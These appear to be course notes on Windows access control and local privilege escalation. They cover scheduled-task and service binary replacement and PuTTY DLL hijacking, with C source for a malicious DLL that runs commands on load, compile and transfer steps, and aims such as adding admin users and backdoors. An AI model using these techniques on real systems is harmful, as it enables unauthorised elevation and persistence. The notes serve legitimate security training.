# WINDOWS ACCESS CONTROL MODEL


### Access Tokens (Users)
- roles
- permissions
- rights

### Security Descriptors (Files)
- DACL: Discretionary Access Control list
- SACL: System access control list
- ACES: Access Controls entries (specify what to audit on the file inside of the SACL)


# WINDOWS PRIVILEGE ESCALATION

Two main ways: scheduled tasks and services
- Binary relpacement is replacing the legitimate binary with a malicious binary
- DLL Hijacking is replacing the legitimate DLL that the binary is calling out to with a malicious DLL

## 1. Scheduled Tasks
- Binary Replacement
- DLL Hijacking


##### Scheduled Tasks Considerations

- Write Permissions

- Non-Standard Locations

- Unquoted Executable Paths

- Vulnerabilities in Executables

- Permissions to Run As SYSTEM

### GETTING SYSINTERNALS TOOLS

` net use * \\live.sysinternals.com\tools`

##### BINARY REPLACEMENT METHODS DEMO

```
SCHTASKS METHOD SETUP
--------------------------------------------------------------------------------------------------------------------------------------------
schtasks /create /TN Putty  /TR "C:\Putty\Putty.exe" /RU SYSTEM /SC onlogon		#create the schedule tasks

mkdir C:\Putty									#create directory called putty in the C:\ location


[putty download](https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html)

#download the putty.exe (ssh and telnet client itself) 32-bit version to winops, move putty.exe to the putty directory
------------------------------------------------------------------------------------------------------------------------------------------------


SCHTASKS METHOD (binary replacement)
-------------------------------------
Premise: non-privileged user who attempted to elevate privileges

1) Determine the conditions

	1. open task scheduler
	2. open General tab in bottom middle pane
	- security options: SYSTEM (indicates privilege level is 'system', which is high level priviliges)

	3. open trigger tab in bottom middle pane
	- trigger: at log on
	- status: enabled


	4. open actions tab in bottom middle pane
	- action: C:\Putty\Putty.exe

2) Determine if we have write permissions at the location

	- attempt to create a file inside the directory. if it works, you can do schedule tasks priv esc!
	
3) Perform actions

	
	Binary replacement:
		a. replace legitimate binary with malicious binary
		b. rename the original binary with a different backup name (i.e. putty.exe -> bak_putty.exe) 
		c. ensure the malicious binary has the name that the actions tab is calling for (i.e. shell.exe -> putty.exe)

		- http://10.50.35.61/uploads
		- File Explorer > View > 
		  [X] File Name Extensions
		  [X] Hidden Items
	
	
4) Reboot / Log On / Log back in

	- shutdown /r /f /t 00



SERVICES METHOD (binary replacement)
---------------------------------------
1) Determine the conditions
	- first open services from windows searchbar, then look at main window
	
	- log on as: Local System
	- startup type: Automatic
	- description: Blank (third party service)

	Third party software may be installed in non-standard windows directory locations
		C:\Windows
		C:\Windows\System32
		
	right click -> properties
	- path to executable: C:\putty\putty.exe

2) Determine vulnerable directory (if we have write permissions)

	- attempt to create a file inside the directory
	
3) Perform actions

	
	Binary replacement:
		a. replace legitimate binary with malicious binary
		b. rename the original binary with a different backup name (i.e. putty.exe -> bak_putty.exe) 
		c. ensure the malicious binary has the name that the actions tab is calling for (i.e. shell.exe -> putty.exe)

		- http://10.50.35.61/uploads
		- File Explorer > View > 
		  [X] File Name Extensions
		  [X] Hidden Items
	
	
4) Reboot /log on / log back in 

```

# DLL PRIVESC IN WINDOWS

```
FINDING THE DLL's WITH PROCMON
--------------------------------
	1. first make sure you have sysinternals tools:

		net use * \\live.sysinternals.com\tools

	2. next use procmon and accept the eula

		.\procmon.exe --accepteula


	3. use the following filters:

		a) process name - contains - putty - include
		b) result - contains - NOT include
		c) path - contains - .dll - include

	4. then run putty, your procmon filters should populate with output now


[putty vulnerability](https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-indirect-dll-hijack-2.html)


PART TWO: Create C source File and compile into DLL
-----------------------------------------------------

1. Install tools on linux machine
	
	 sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y

2. THE actual C source code: (located also on linops at /security/scripts/sspicli.c)

	########## SSPICLI.c ########## 
	#include <windows.h>
	int execCommand()
	{
	 WinExec("cmd /C whoami > FINDME_1.txt", 1);					#change 1 to 0 if you want to be stealthy: 1 specifies to pop up on the desktop when it opens
	 return 0;									#if you want to run different commands from here, jhust change what the WinExec line does. make sure you escape special characters with backslashes!
	}
	BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
	{
	 execCommand();
	 return 0;
	}
	########## SSPICLI.c ##########


		- ways we can escalate our privileges?
			1. Created user, added that user to both remote desktop users and administrators
			2. add existing users to privilege groups
			3. establish persistence by creating backdoors
			
3. Compule the raw C source code into an unlined C object 

	i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o

4. Create the DLL from unlinked C object 

	i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a

5. Ensure we have the SSPICLI.dll

	ls SSPICLI*
	
		#should return the SSPICLI.c, SSPICLI.dll, SSPICLI.o, and SSPICLI.a


6. Transfer file to location 
	
	- python HTTP server
		linops > python3 -m http.server
		winops > navigate to your linops_ip:8000 in your browser then hit enter to open up the http server and directly download the files
	- SCP
	- Base64
	



```



## 2. Services
- Binary Replacement
- DLL Hijacking

### DLL Search 

C:\Windows
C:\Windows\system32

### UAC

Checking for the UAC settings:
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
>> `EnableLUA   REG_DWORD   0x1   `
                              ^--------0x1 indicates UAC on, 0x0 indicates UAC off


### File Manifest
- Requested Execution Level: asInvoker, highestAvailable, asAdministrator

Autoelevate: True or N/A


## FILE MANIFEST DEMO
 `net use * \\live.sysinternals.com\tools`		#map the sysinternals tools to the next available drive so you can use them
  `.\sigcheck.exe -m C:\Windows\System32\eventvwr.exe`	# outputs the file manifest for eventvwr.exe with absolute path
  
 
 ` .\sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i autoelevate`		#find if the eventvwr.exe binary has autoelevate TRUE or FALSE
 
 `.\sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level`		#find the requested execution levels of the eventvwr.exe binary
 
 



